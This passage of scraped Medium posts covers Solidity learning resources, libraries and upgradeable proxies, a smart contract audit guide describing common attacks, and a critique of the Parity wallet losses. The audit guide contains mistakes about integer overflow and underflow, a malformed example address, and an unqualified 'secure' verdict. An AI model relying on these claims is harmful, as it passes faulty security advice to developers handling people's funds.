Full code samples of Organisation and its Parent contract responsible for managing it can be found below.Organisation.solThe Parent contract is responsible for creating and upgrading Organisations.Parent.sol", "responses": 13, "tags": ["Ethereum", "Blockchain", "Smart Contracts"]}, {"title": "Learn Solidity \u2014 The Ethereum smart contract programming language", "post_link": "https://medium.com/@robbertvermeulen/learn-solidity-the-ethereum-smart-contract-programming-language-7f106fc26d6?source=search_post---------6", "author_name": "Robbert Vermeulen", "author_link": "https://medium.com/@robbertvermeulen", "publish_date": "2018-01-12", "last_modified_date": "2018-12-27", "readtime": "1.76", "claps": 2043, "voters": 256, "content": "Learn Solidity \u2014 The Ethereum smart contract programming languageRobbert VermeulenFollowJan 12, 2018 \u00b7 2 min readIn the course of time that I am involved in Ethereum development, I have noticed that not much information exists yet to learn Solidity (outside of the Solidity documentation).I have saved the information that I found in the meantime and the goal of this article is to share all my gathered resources, so other people new in this world don\u2019t have to search, but can start learning Solidity immediately.1. Solidity video tutorialsCoursesSolidity by What\u2019s SolidityDeveloping Ethereum Smart Contracts for Beginners by DesignCourseUltimate Introduction to Ethereum \u00d0app Development by Decypher mediaBuilding Ethereum dapp using Solidity by Shlomi zeltsingerEthereum Smart Contracts In Solidity by What the Func?Solidity and smart contracts tutorial for beginners by Vlad WulfICO developmentHow to build an ICO crowdsale with Open Zeppelin by Roman StormIt\u2019s too easy to launch ICO by shlomi zeltsingerDapp developmentHOWTO: Building Ethereum Apps With Truffle by Tim CoulterTutorial dapp with Solidity, Truffle, Web3 and Javascript by Blockchain Talks2. Solidity tutorialsBasicsA 101 Noob Intro to Programming Smart Contracts on EthereumLearn Solidity in Y minutesLearning Solidity by ExampleFull stack Hello world voting Ethereum Dapp tutorialBuild Your First Smart ContractMonax smart contract tutorialHow To Learn Solidity: The Ultimate Ethereum Coding GuideInteractiveCryptoZombiesSpace DoggosBitDegree Basic of SoliditySpecialtiesTyping and Your Contracts StorageDeploying A Smart Contract, The Hard WayRevert(), Assert() and Require()Constant vs View vs PureDapp developmentThe ultimate end-to-end tutorial to create and deploy a fully decentralized Dapp in Ethereum3. Smart contract examplesEtherdice (Ethereum-based dice game)Zeppelin Solidity (ICO and token smart contracts)Ethereum Slot machine Dapp (Ethereum-based slot machine)Etherpot (lottery)The DAO framework \u2014 Decentralized Autonomous Organization4. Solidity communitiesEthereum Developers Facebook groupSolidity RedditEthereum StackexchangeSolidity GitterEthereum Gitter (solidity channel)5. Solidity tools & frameworksZeppelin Solidity (development framework)Truffle (development framework)Remix Solidity IDE (Integrated development environment)Web3.js (Ethereum Javascript API)Solium (Analyzes your code for style & security issues)Javascript TestRPC (local blockchain development)MetaMask (browser extension)Geth (command line interface to run a full Ethereum node)Solc (Solidity compiler)6. Solidity booksSolidity Programming Essentials: A beginner\u2019s guide to build smart contracts for Ethereum and blockchainIntroducing Ethereum and Solidity: Foundations of Cryptocurrency and Blockchain Programming for BeginnersEthereum Smart Contract Development: Build blockchain-based decentralized applications using Solidity", "responses": 11, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Development", "Blockchain"]}, {"title": "Solidity Smart Contracts Programming", "post_link": "https://medium.com/@ksystemsio/solidity-smart-contracts-programming-6d43b739102?source=search_post---------7", "author_name": "K SYSTEMS LTD", "author_link": "https://medium.com/@ksystemsio", "publish_date": "2018-08-24", "last_modified_date": "2018-08-24", "readtime": "1.33", "claps": 5190, "voters": 244, "content": "Solidity Smart Contracts ProgrammingK SYSTEMS LTDFollowAug 24, 2018 \u00b7 2 min readWe set up and deploy your Solidity Smart Contracts within a few hours from your order, and you get to populate a planet with your project details in our Galaxy, the most advanced showroom available for startups today! The price? Only 12000 KSYS Tokens all inclusive!How did we achieve that?We used the Token Market Smart Contracts and our skills to develop an Open Zeppelin secured, state of the art, Solidity Coding Wizard. It helps up speeding up the coding and debugging of your Smart Contracts. We give you the source code so that you can easily verify it and publish it on Etherscan, but we do not stop here\u2026 You also get:Solidity programming languageOne Planet in the K Galaxy, the finest showroom in the Crypto Universe.A subdomain @ ksystems.io, our Corporate Domain. That means an amazing visibility in our constantly growing Community.FREE 12/7 dedicated customer support service. You can have a 24/7 customer support service for as little as 7000 KSYS Tokens a month.You will find all the required info about this service in our KSYS Shop.The KSYS Shop will open officially during Q4, 2018.Stay tuned, join our official Telegram Channel or Telegram Group for the latest updates!", "responses": 4, "tags": ["Ethereum", "Smart Contracts", "Solidity", "ICO"]}, {"title": "Library Driven Development in Solidity", "post_link": "https://medium.com/aragondec/library-driven-development-in-solidity-2bebcaf88736?source=search_post---------8", "author_name": "Jorge Izquierdo", "author_link": "https://medium.com/@izqui9", "publish_date": "2017-02-13", "last_modified_date": "2018-07-10", "readtime": "7.05", "claps": 1264, "voters": 241, "content": "Library Driven Development in SolidityA comprehensive review on how to develop more modular, reusable and elegant smart contract systems on top of the Ethereum Virtual Machine by using librariesJorge IzquierdoFollowFeb 13, 2017 \u00b7 8 min readSolidity is a limited languageComing to Ethereum mainly from the lands of Swift and Javascript, developing in Solidity is definitely a step back in terms of what the language allows the programmer to do and the expressiveness of the language.Solidity, and in general languages that compile to bytecode intended to be executed in the EVM, are limited because:When executed, your code will run on every node of the network. Once a node receives a new block, it will verify its integrity. In Ethereum this also means verifying that all the computations that happened on that block were performed correctly and the new state of contracts is correct.This causes that, even though the EVM is Turing-complete, heavy computations are expensive (or directly not allowed by the current gas limit) because every node will need to perform it, therefore slowing the network.A standard library hasn\u2019t really been developed yet. Arrays and strings are specially painful, I have personally had to implement my own ASCII encoding and decoding and an algorithm to lowercase strings by hand, which are tasks I never had to even think about in other languages/platforms.You cannot get data from the outside world (out of the EVM) unless it gets in via a transaction (Oracle) and once a contract is deployed it is not upgradable (you can plan for migrations or pure storage contracts, though).Some of this limitations are needed for the existence of the Ethereum computing platform (you will never be able to store a backup of your Google Photos and perform image recognition purely on-chain, and that is just fine). Other limitations are here just because it is a really young technology (though evolving blazingly fast) and it will keep improving over time.That being said, it is very possible to build interesting projects on top of Ethereum today. I have personally recently discovered the use of libraries as a way to keep code clean and organized.What is a libraryIn Solidity, a library is a different type of contract, that doesn\u2019t have any storage and cannot hold ether. Sometimes it is helpful to think of a library as a singleton in the EVM, a piece of code that can be called from any contract without the need to deploy it again.This has the obvious benefit of saving substantial amounts of gas (and therefore not contaminating the blockchain with repetitive code), because the same code doesn\u2019t have to be deployed over and over, and different contracts can just rely on the same already deployed library.The fact that multiple contracts depend on the exact piece of code, can make for a more secure environment. Imagine not only having well audited code for common endeavors (like the tremendous job the guys at Zeppelin are doing), but relying on the same deployed library code that other contracts are already using. It would certainly have helped in this case, where all balances of an ERC20 token (nothing too fancy), that was intended to raise a maximum of $50M, were whipped out.Disclaimer: Everything below was written for Solidity v0.4.8, given the current rate at which it is evolving, it might be outdated soon.Enough buzz words, what is a libraryA library is a type of contract that doesn\u2019t allow payable functions and cannot have a fallback function (this limitations are enforced at compile time, therefore making it impossible for a library to hold funds). A library is defined with the keyword library (library C {}) in the same way a contract is defined (contract A {}).Calling a function of a library will use a special instruction (DELEGATECALL), that will cause the calling context to be passed to the library, as if it was code running in the contract itself. I really like this angle from the Solidity documentation, \u201cLibraries can be seen as implicit base contracts of the contracts that use them\u201d.In this snippet, when function a() of contract A is called, the address of the contract will be returned and not the library\u2019s. This appears to be the same for all msg properties msg.sender, msg.value, msg.sig, msg.data and msg.gas. (Solidity documentation related to this indicates otherwise, but after doing some testing it looks like msg context is maintained)How libraries are linkedDifferent from explicit base contract inheritance (contract A is B {}) a contract that depends on a library is not that clear how it gets linked with it. In the above case, contract A uses library C in its function a(), but there is no mention of what address of the library to use, and C won\u2019t get compiled inside A\u2019s bytecode.Library linking happens at the bytecode level. When contract A is compiled, it leaves a placeholder for the library address in this way 0073__C_____________________________________630dbe671f(0dbe671f is the function signature for a()). If we were to deploy contract A untouched, the deployment would fail as the bytecode is invalid.Library linking is as simple as replacing all occurrences of the library placeholder in the contract bytecode with the address of the deployed library in the blockchain. Once the contract is linked to the library, it can be deployed.How libraries are upgradedOriginal (Feb 2017): They are not, in the same way contracts aren\u2019t either. As stated in the previous section, the reference to the library is made at the bytecode level rather than at the storage level. Changing the bytecode of a contract is not allowed once deployed, therefore the reference to the library will live as long as the contract does.UPDATE (March 2017): We have been working on the library upgradeability problem for the last weeks since the publication of this article on a way to upgrade libraries. We have been working with our friends at Zeppelin and have published an article about it:Proxy Libraries in SolidityThis is a joint post by Zeppelin and Aragon.medium.comWith this new method instead on linking a contract against a library address, it can be linked with the dispatcher and that will allow for updating the underlying library later own, and upgrade the business logic of the contract.\u2018Using\u2019 structs and methodsEven though libraries do not have storage, they can modify their linked contract\u2019s storage. When passed astorage reference as an argument to a library call, any modifications the library does, will be saved in the contract\u2019s own storage. It is helpful to think of it as to passing a C pointer to a function, only that in this case the library may have been deployed by someone else and lives on the blockchain.Also, one piece of syntax sugar that makes for easily understandable code is using using. Using this keyword, a function in the library can be called as a method of its first parameter, making it look like it is a proper method.The using keyword allows for calling functions in CounterLib for all functions that take a Counter as a first argument, as if they were a method of the struct.This construct is pretty similar of how you can execute methods on Go structs, without them being fully-fledged objects.Events and librariesIn the same way that libraries don\u2019t have storage, they don\u2019t have an event log. But they can dispatch events, let me explain that:As stated above, a library can be thought of as an implicit base contract, and in the same way that if a explicit base contract dispatches an event it will appear in the main contract event log, same thing happens with libraries, they will be saved in the event log of the contract that calls the event emitting function in the library.Only problem is, as of right now, the contract ABI does not reflect the events that the libraries it uses may emit. This confuses clients such as web3, that won\u2019t be able to decode what event was called or figure out how to decode its arguments.There is a quick hack for this, defining the event both in the contract and the library will trick clients into thinking that it was actually the main contract who sent the event and not the library.Here is a small example illustrating this, even though the Emit event is emitted by the library, by listening on EventEmitterContract.Emit we will be able to get the events. In contrast, listening on EventEmitterLib.Emit will never get any events.Implementing ERC20LibAs a real world example on developing with libraries, I\u2019m going to refactor Zeppelin\u2019s ERC20 StandardToken to be built using libraries.The first step will be to rewrite SafeMath to be a library, as because of its current design to be used as a base contract won\u2019t work, because libraries aren\u2019t allowed to inherit. Also this refactor will make using SafeMath more clear: (safeMul(2, 3) vs 2.times(3) )https://github.com/AragonOne/zeppelin-solidity/blob/master/contracts/SafeMathLib.solEven though libraries cannot directly inherit, they can be linked with other libraries and use them in the same way a contract would, but with the natural limitations of libraries.Now for the real work, ERC20Lib is be the library that contains all the business logic related to managing a ERC20 token. It defines the TokenStorage struct which holds all the storage a token needs, and all its functions.https://github.com/AragonOne/zeppelin-solidity/blob/master/contracts/token/ERC20Lib.solNow that all the required logic is encapsulated in the library, implementing StandardToken is trivial and will only contain code specific to that token and accessor functions that directly call methods on the library using TokenStorage (and the event declaration as we explained above).https://github.com/AragonOne/zeppelin-solidity/blob/master/contracts/token/StandardToken.solThe interesting part of this approach is that both ERC20Lib and SafeMathLib only need to be deployed once and all the contracts that link ERC20Lib will be using the same, secure, audited code.The full refactor is in Aragon\u2019s Zeppelin fork, and all the tests related to StandardToken are still passing even thought its internal architecture is fundamentally changed.Wrapping upAs we the first lines of the article said, Solidity has still a long way to go in terms of programmer productivity and language expressiveness. In my opinion, libraries are a very good way to achieve code reusability.For us at Aragon, developing with libraries is very important as we plan to deploy many times the same code with slight modifications or none at all. Using this architecture will allow our clients to save in transaction fees and also have a proof that the software their company is running is the same one that powers other successful organizations.Aragon is a platform for building blockchain companies (DAOs) on top of Ethereum.We will be in EDCON this week, so please come say hi. If this article seems like interesting work, join our Slack community or come work with us!", "responses": 12, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Libraries", "Development"]}, {"title": "The ultimate guide to audit a Smart Contract + Most dangerous attacks in Solidity", "post_link": "https://medium.com/ethereum-developers/how-to-audit-a-smart-contract-most-dangerous-attacks-in-solidity-ae402a7e7868?source=search_post---------9", "author_name": "Merunas Grincalaitis", "author_link": "https://medium.com/@merunasgrincalaitis", "publish_date": "2017-09-17", "last_modified_date": "2018-10-28", "readtime": "11.0", "claps": 1617, "voters": 207, "content": "The ultimate guide to audit a Smart Contract + Most dangerous attacks in SolidityMerunas GrincalaitisFollowSep 17, 2017 \u00b7 12 min readHave you ever wondered how to audit a Smart Contract to find security breaches?You can learn it by yourself or you can use this handy step-by-step guide to know exactly what to do at what moment and audit those contract.I\u2019ve been researching several Smart Contract audits and I\u2019ve learn the most common steps they took to extract all the essential information from any contract.You\u2019ll learn the following:Steps to take in order to fully audit a Smart Contract to generate a pdf with all the findings.The most important types of attacks that you need to know as an Ethereum Smart Contract Auditor.What to look for in a contract and useful tips that you won\u2019t find anywhere else but here.Let\u2019s get right to it and start auditing contracts:How to audit a Smart ContractTo teach you exactly how to do this, I\u2019ll audit one of my own contracts. This way you\u2019ll see a real world audit that you can apply by yourself.Now you may ask: what exactly is a Smart Contract audit?A Smart Contract audit is the process investigating carefully a piece of code, in this case a Solidity contract to find bugs, vulnerabilities and risks before the code is deployed and used in the main Ethereum\u2019s network where it won\u2019t be modifiable. It\u2019s just for discussion purposes.Note that an audit isn\u2019t a legal document that verifies that the code is secure. Nobody can 100% assure that the code won\u2019t have future bugs or vulnerabilities. It\u2019s a guarantee that your code has been revised by an expert and it\u2019s secure.To discuss possible improvements and mostly to find bugs and vulnerabilities that could risk people\u2019s ether.Once that\u2019s clear, let\u2019s take a look at the structure of a Smart Contrac Audit:Disclaimer: Here you\u2019ll say that the audit is not a legally binding document and that it doesn\u2019t guarantee anything. That it\u2019s just a discussion document.Overview of the audit and nice features: A quick view of the Smart Contract that will be audited and good practices found.Attacks made to the contract: In this section you\u2019ll talk about the attacks done to the contract and the results. Just to verify that it is, in fact secure.Critical vulnerabilities found in the contract: Critical issues that could damage heavily the integrity of the contract. Some bug that would allow attackers to steal ether is a critical issue.Medium vulnerabilities found in the contract: Those vulnerabilities that could damage the contract but with some kind of limitation. Like a bug allowing people to modify a random variable.Low severity vulnerabilities found: Those are the issues that don\u2019t really damage the contract and could exists in the deployed version of the contract.Line by line comments: In this section you\u2019ll analize the most important lines where you see potential improvements.Summary of the audit: Your opinion about the contract and final conclusions about the audit.Save that structure somewhere safe because it\u2019s all you need to really audit a Smart Contract securely. It will really help you find those hard to find vulnerabilities.I recommend you starting by the point 7 \u201cLine by line comments\u201d because when analizing the contract line by line, you\u2019ll find the most important issues and you\u2019ll see what\u2019s missing. What could be changed or improved.I\u2019ll show you a disclaimer that you can use as it is for the first step of the audit. You can go to point 1 and go down from there until the audit is finished.Next I\u2019ll show you my personal audit that I made for one of my contracts using that structure with those steps. You\u2019ll also see a description of the most important attacks that can be made to a Smart Contract on step 3.Casino Ethereum AuditYou can see the code being audited in my github: https://github.com/merlox/casino-ethereum/blob/master/contracts/Casino.solThis is the audit of my contract Casino.sol:IntroductionIn this Smart Contract audit we\u2019ll cover the following topics:DisclaimerOverview of the audit and nice featuresAttack made to the contractCritical vulnerabilites found in the contractMedium vulnerabilites found in the contractLow severity vulnerabilites foundLine by line commentsSummary of the audit1. DisclaimerThe audit makes no statements or warrantees about utility of the code, safety of the code, suitability of the business model, regulatory regime for the business model, or any other statements about fitness of the contracts to purpose, or their bug free status. The audit documentation is for discussion purposes only.2. OverviewThe project has only one file, the Casino.sol file which contains 142 lines of Solidity code. All the functions and state variables are well commented using the natspec documentation for the functions which is good to understand quickly how everything is supposed to work.The project implements the Oraclize API to generate truly random numbers on the blockchain using a centralized service.Generating random numbers on the blockchain is quite a hard topic because one of the core values of Ethereum is predictability whose goal is to not have undefined values.Therefore the use of the trusted number generation from Oraclize is considered good practice since they generate random numbers off-chain. It implement modifiers and a callback function that verifies that the information is comming from a trusted entity.The purpose of this Smart Contract is participate in a random lotery where people bet for a number between 1 and 9. When 10 people place their bets, the prize is automatically distributed across the winners. There\u2019s also a minimum bet amount for each user.Each player can only bet once during each game and the winner number is only generated when the limit of bets has been reached.Nice FeaturesThe contract provides a good suite of functionality that will be useful for the entire contract:Secure random number generation with Oraclize and proof verification on the callback.Modifiers to check for the end game, blocking the critical functions until the rewards are distributed.Good amount of check for verifying that the bet function is used propertly.Secure number winner generation only when the maximum of bets has been reached.3. Attacks made to the contractIn order to check for the security of the contract, we tested several attacks in order to make sure that the contract is secure and follows best practices.Reentrancy attackThis attack consists on recursively calling the call.value() method in a ERC20 token to extract the ether stored on the contract if the user is not updating the balance of the sender before sending the ether.When you call a function to send ether to a contract, you can use the fallback function to execute again that function until the ether of the contract is extracted.Because this contract uses transfer() instead of call.value() , there\u2019s no risk of reentrancy attacks since the transfer function only allows to use 23.000 gas which you can only use for an event to log data and throws on failure.That way you\u2019re unable to recursively call again the sender function thus avoiding the reentrancy attack.The transfer function is called only when distributing the rewards to the winners which happens once per game, when the game ends. So there shouldn\u2019t be any problem with reentrancy attacks.Note that the condition to call this function is that the number of bets is bigger or equal the limit of 10 bets but that condition isn\u2019t updated until the end of the distributePrizes() function which is risky because someone could theorically be able to call that function and execute all the logic before updating the state.So my recommendation is to update the condition when the function starts and set the number of bets to 0 to avoid calling the distributePrizes() more times than expected.Over and under flowsAn overflow happens when the limit of the type varibale uint256 , 2**256, is exceeded. What happens is that the value resets to zero instead of incrementing more.For instance, if I want to assign a value to a uint bigger than 2**256 it will simple go to 0 \u2014 this is dangerous.On the other hand, an underflow happens when you try to substract 0 minus a number bigger than 0.For example, if you substract 0 -1 the result will be = 2**256 instead of -1.This is quite dangerous when dealing with ether. Hovewer in this contract there\u2019s no substraction anywhere so there\u2019s no risk of underflows.The only time an overflow could happen is when you bet() for a number and the totalBet variable\u2019s amount is increased:totalBet += msg.value;Someone could send a huge amount of ether that would exceed the limit of 2**256 and therefore making the total bet 0. This is improbable but the risk is there.Therefore I recommend using a library like the OpenZeppelin\u2019s SafeMath.sol.It\u2019ll help you make secure calculations without the risk of under or over flows.The way you use it is by importing the library, activating it for uint256 and then using the function .mul(), .add(), sub() and .div(). For instance:import './SafeMath.sol';contract Casino {    using SafeMath for uint256;    function example(uint256 _value) {        uint number = msg.value.add(_value);    }}Replay attackThe replay attack consists on making a transaction on one blockchain like the original Ethereum\u2019s blockchain and then repeating it on another blockchain like the Ethereum\u2019s classic blockchain.The ether is transfered like a normal transaction from a blockchain to another.Though its no longer a problem because since the version 1.5.3 of Geth and 1.4.4 of Parity both implement the attack protection EIP 155 by Vitalik Buterin: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.mdSo the people that will use the contract depend on their own ability to be updated with those programs to keep themselves secure.Reordering attackThis attack consists in that a miner or other party tries to \u201crace\u201d with a smart contract participant by inserting their own information into a list or mapping so the attacker may be lucky in getting their own information stored on the contract.When a user places his bet() and the data is saved on the blockchain, anybody will be able to see what number has been bet by simply calling the public mapping playerBetsNumber .That mapping shows what number has each person selected. Hence, in the transaction data you can esasily see the amount of ether that has been bet.This could happen in the distributePrizes() function because it\u2019s called when the callback of the random number generation is invoked.Because the condition of that function isn\u2019t updating until the end of it, there is a risk of a reordering attack.Consequently, my recommendation is like I said before: to update the condition of the number of bets at the beggining of the distributePrizes() function to avoid this kind of undexpected behaviour.Short address attackThis attack affects ERC20 tokens, was discovered by the Golem team and consists of the following:A user creates an ethereum wallet with a traling 0, which is not hard because it\u2019s only a digit. For instance: 0xiofa8d97756as7df5sd8f75g8675ds8gsdg0Then he buys tokens by removing the last zero:Buy 1000 tokens from account 0xiofa8d97756as7df5sd8f75g8675ds8gsdgIf the token contract has enought amount of tokens and the buy function doesn\u2019t check the length of the address of the sender, the Ethereum\u2019s virtual machine will just add zeroes to the transaction until the address is complete.The virtual machine will return 256000 for each 1000 tokens bought. This is a bug of the virtual machine that\u2019s yet not fixed so whenever you want to buy tokens make sure to check the length of the address.The contract isn\u2019t vulnerable to this attack since it\u2019s not an ERC20 token.You can read more about the attack here: http://vessenes.com/the-erc20-short-address-attack-explained/4. Critical vulnerabilites found in the contractThere aren\u2019t critical issues in the smart contract audited.5. Medium vulnerabilites found in the contractThe function checkPlayerExists() isn\u2019t constant when it should.Ergo this increases the costs of the gas every time the function is called which is a big problem when dealing with a lot of calls.Make it constant and avoid expensive gas executions.6. Low severity vulnerabilites foundYou\u2019re using assert() instead of require() in all the cases and at the beggining of the functions __callback() and pay().Assert and require behave almost identically but the assert function is used to validate contract state after making changes, while require is normally used at the top of the functions to verify the input of the function.2. You\u2019re defining the variable players at the beggining of the contract but you aren\u2019t using it anywhere. Remove it if you\u2019re not gonna use it.7. Line by line commentsLine 1: You\u2019re specifiying a pragma version with the caret symbol (^) up front which tells the compiler to use any version of solidity bigger than 0.4.11 .This is not a good practice since there could be major changes between versions that would make your code unstable. That\u2019s why I recommend to set a fixed version without the caret like 0.4.11.Line 14: You\u2019re defining the uint variable totalBet in singular which isn\u2019t correct since it stores the sum of all the bets. My recommendation is to change it to plural, totalBets instead of totalBet.Line 24: You\u2019re defining the constant variable in caps which is a good practice to know that it\u2019s a fixed, unmodified variable.Line 30: Like I said before, you\u2019re defining an unused array player . Remove it if you\u2019re not gonna use it.Line 60: The function checkPlayerExists() should be constant but it isn\u2019t. Because it doesn\u2019t modify the state of the contract, make it constant and save some gas every time it executes.Also it\u2019s good practice to specify the type of visibility the function has even if it\u2019s the default value of public to avoid confusion. To that end, add the public visibility parameter to the function explicitly.Line 61: You\u2019re not checking if the parameter player is sent and well formated. Make sure to use a require(player != address(0)); at the top of that function to checking if an invalid address exists or not. Also check the length of the address to protect the code from short address attacks just in case.Line 69: Again, specify the visibility of the function bet() explicity to avoid confusion and know exacly how it\u2019s supposed to get called.Line 72: Use require() instead of assert() for checking that the input of the function is well formated.Likewise at the beggining of the functions require() is more often used. Change all those assert() at the beggining to require().Line 90: You\u2019re using a simple sum in the msg.value variable. This could lead to overflows since the value could get quite big. That\u2019s why I recommend to check for overflows and underflows any time you\u2019re making a calculation.Line 98: The function generateNumberWinner() should be internal since you don\u2019t want anybody to execute it outside the contract.Line 103: You\u2019re saving the result of oraclize_newRandomDSQuery() in a bytes32 variable. This isn\u2019t required to execute the callback function. Also you\u2019re not using that variable anywhere. So I recommend to not assign that value and just call the function.Line 110: The __callback() function should be external because you only want it to be called from outside.Line 117: That assert should be require for the reasons I explained above.Line 119: You\u2019re using shae() which isn\u2019t a good practice since the algorythm used isn\u2019t exacly sha3 but keccak256. My recommendation is to change it to keccak256() instead for clarity purposes.Line 125: The function distributePrizes() should be internal because only the contract should be able to call it.Line 129: Although you\u2019re using a variable sized array for a loop it\u2019s not that bad because the amount of winners should be limited to less than 100.8. Summary of the auditOverall the code is well commented and clear on what it\u2019s supposed to do for each function.The mechanism to bet and distribute rewards is quite simple so it shouldn\u2019t bring major issues.My final recommendation would be to pay more attention to the visibility of the functions since it\u2019s quite important to define who\u2019s supposed to executed the functions and to follow best practices regarding the use of assert, require and keccak.This is a secure contract that will store safely the funds while it\u2019s working.ConclusionThat\u2019s all the audit that I did by myself using the structure explained at the beggining. Hope you learned something and now you\u2019re capable of making secure audits to other Smart Contracts.Keep learning and improving your knowledge about contract security, best practices and new functionalities.If you enjoyed this article make sure to:Follow me on twitter @merunas2Clap this article as long as your hart desiresShare the article with your fellow Ethereum developersComment your questions, improvements and typos foundBring me work as an Ethereum developer. I\u2019m always willing to take more work!", "responses": 9, "tags": ["Ethereum", "Solidity", "Dapps", "Dapp Daily", "Audit"]}, {"title": "Proxy Libraries in Solidity", "post_link": "https://medium.com/zeppelin-blog/proxy-libraries-in-solidity-79fbe4b970fd?source=search_post", "author_name": "Manuel Araoz", "author_link": "https://medium.com/@maraoz", "publish_date": "2017-03-06", "last_modified_date": "2019-02-13", "readtime": "2.77", "claps": 1185, "voters": 211, "content": "Proxy Libraries in SolidityThis is a joint post by Zeppelin Solutions and Aragon.Manuel AraozFollowMar 6, 2017 \u00b7 3 min readWe recently read some articles about neat tricks and hacks one can do in Solidity. Specifically, Jorge Izquierdo\u2019s article on Library Driven Development and Simon de la Rouviere\u2019s article on ThrowProxy.That got us thinking about using those ideas to turn Zeppelin into an upgradeable blockchain-deployed library. Currently, Zeppelin is a collection of secure and community-vetted contracts for anyone to use. This is work towards creating security standards and industry best practices. But in order to use them, developers have to download our code and deploy parallel copies of it alongside their application-specific contracts.This has several disadvantages:Deployment gas costs.Code repetition in the blockchain.Bug fixes and updates need to be deployed independently on each project (or, even worse, Ethereum has to hard fork to fix a contract\u2019s problems).What if we could have a deployed version of a library in the blockchain, which all projects using Zeppelin could link directly? That\u2019s the idea behind Solidity\u2019s libraries. The problem is, once a library code is deployed, it\u2019s immutable. For Zeppelin, being able to fix security vulnerabilities and add more reusable modules is key for our users. Thus, we\u2019d need some mechanism to upgrade the contract\u2019s code.Some attempts to do this are Martin Swende\u2019s generic proxy and Arachnid\u2019s upgradeable contract, but have their drawbacks and can\u2019t be used for libraries.Our idea: Use a normal contract, but call it as a library (use delegatecall instead of call)Result: It works!Proposed implementationCode: https://github.com/maraoz/solidity-proxy/blob/master/test/test.es6maraoz/solidity-proxysolidity-proxy - Solidity implementation of a delegate proxygithub.comCheck it out and please give us feedback! We\u2019ll be evaluating how to use this new technique to turn Zeppelin into a deployed upgradable library in the next few weeks.On a more technical level, our solution flow looks like this:Instead of linking the main, user facing contract directly with the address of the deployed library, it is linked to a \u2018Dispatcher\u2019. At compile and deploy time this is just fine, even though the Dispatcher doesn\u2019t implement any of the methods of the library, if the bytecode has a valid address the deploy will be successful.When a transaction comes in, the main contract thinks it is making a delegatecall to the library it is linked with. But this delegatecall will instead be made to the dispatcher.Here is where things get interesting. Once the dispatcher catches the delegatecall in its fallback function it figures out what the correct version of the library code is, and redirects the call once again with a delegatecall. Once the library returns, the return will go all the way back to the main contract.LimitationsThe dispatcher needs to know what the memory size for the return of that library call is. Right now we solved it by having a mapping for function signatures to their return type size. This was intentionally kept out of the drawing for the sake of simplicity.Given the way delegatecall\u2019s work on the EVM level, you can only use it from one contract to another that have the same storage footprint. As libraries have no storage, we kept Dispatcher with no storage. That\u2019s why a separate DispatcherStorage to keep all the data it needs. Also, the address of the DispatcherStorage needs to be hardcoded in the contract bytecode.Note that for the user contract nothing special is needed, only that instead of being linked with the concrete version of the library, it has to be linked with the dispatcher.Future workAllow data migration of user contracts when library is upgraded (data structures may change). Golem\u2019s GTN Token has a migration mechanism that could serve as inspiration.Storage layout sanity checks in the proxy.Arbitrary code execution on contracts for emergencies.We\u2019ll be writing about these topics in the following weeks.Thanks Christian Reitwiessner for reviewing and commenting on early drafts.Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 16, "tags": ["Ethereum", "Blockchain", "Smart Contracts", "Security", "Solidity"]}, {"title": "Turing Incompleteness and the Sad State of Solidity", "post_link": "https://blog.lamden.io/turing-incompleteness-and-the-sad-state-of-solidity-d5278ba4eda0?source=search_post", "author_name": "Stuart Farmer", "author_link": "https://blog.lamden.io/@stuartrfarmer", "publish_date": "2017-11-08", "last_modified_date": "2018-06-11", "readtime": "4.63", "claps": 1253, "voters": 142, "content": "Turing Incompleteness and the Sad State of SolidityStuart FarmerFollowNov 8, 2017 \u00b7 5 min readUpdate: the grand total is around $280,000,000 of frozen assets. AKA: 600% of the DAO hack, and 1000% of the 1st parity hack.Update 2: We are now creating our own Turing Incomplete variation of the Python language called Seneca that will be used for Smart Contracts on our blockchain, Cilantro.So Parity\u2019s and Ethereum\u2019s founder Gavin Wood lost all of his money from his new ICO venture Polkadot that is supposed to revolutionize and connect blockchains together with some strange paradigms of \u2018fishermen\u2019 because he can\u2019t seem to implement one of the most basic smart contracts on Earth.Fact: A system\u2019s worth is determined by how complex and convoluted it is, the number of pretty graphics in the whitepaper, and the quirkiness of the metaphors used to describe the concepts within. See the Plasma whitepaper for more information.Back in July, some hacker drained a ton of multisig wallet contracts because the developers (lead by Gavin) left a single modifying variable out of a function which allowed the public to essentially steal control on any multisig wallet they wanted.Someone forgot to add the word \u2018internal\u2019 to this function, and that\u2019s what caused the 1st Parity hack of $30,000,000 to occur.That hack drained about $30,000,000. Parity pushed out a major release and had a way to turn your old multisig wallets into new multisig wallets. All fine and dandy.Gavin Wood after the 1st hack when none of the money that was stolen was his (/s)And then some random kid poking smart contracts online to learn about Ethereum accidentally sent a kill command to the library contract that all of these new multisig wallet contracts were based off, rendering all of these new contracts unusable.At least he opened a GitHub issue letting the devs know that anyone could kill their smart contract.Thus, whoever had money inside of those NEW multisig wallets that were supposed to have gone through a new wave of security checks now had their funds frozen. That included Gavin himself and experts are saying the number of funds that have been frozen in wallets is around $150,000,000 to $200,000,000.Gavin after being told that all of his ICO funds were frozen (/s)Remember when the DAO happened? It was a mess because instead of letting the system ride out and trying to fix the security problem of having a Turing complete virtual machine on a blockchain, the key developers decided to just hard fork the ledger, give everyone\u2019s money back (some of which was Vitalik\u2019s) and continue on.This makes the system no different than a PayPal or a credit card company where the managers can revert payments from people who steal your card info.The DAO hack was an estimated $50,000,000. That would make this new Parity hack at least 3 times more severe. Four times if you take into account the previous hack as well. Will the core developers fork Ethereum again? It\u2019s unknown. They\u2019ve done it before and Gavin has a lot of pull in the community.Why do these hacks keep happening?In computer science, there\u2019s a concept of a Turing complete machine. A Turing complete machine is able to do everything that a modern computer can do from a mathematical standpoint. This is powerful because that means you can do a lot with it, especially when it is paired with a blockchain and a programming language.What it also does, unfortunately, is introduce an infinite and unknown amount of attack vectors, which are potential ways that the system can be hacked. Combine this with a team of developers who fail to implement a robust set of test suites to make sure that the known attack vectors are handled and you get the ridiculous meltdown we are currently witnessing.Something you should also know is that while you can\u2019t prevent bad programmers from programming bad code, Ethereum has a duty to produce their smart contracting language in a way that mitigates these sorts of potential attack vectors. That would be great if there were people actually working on the core development of Solidity.Solidity development itself has 2 people working on it full time. The market cap of Ethereum is over $25,000,000,000. Two people are working on the smart contracting system for a multi-billion dollar system that has unknown levels of attack vectors.A graph of who\u2019s working on Solidity. Right now, only two core developers for a 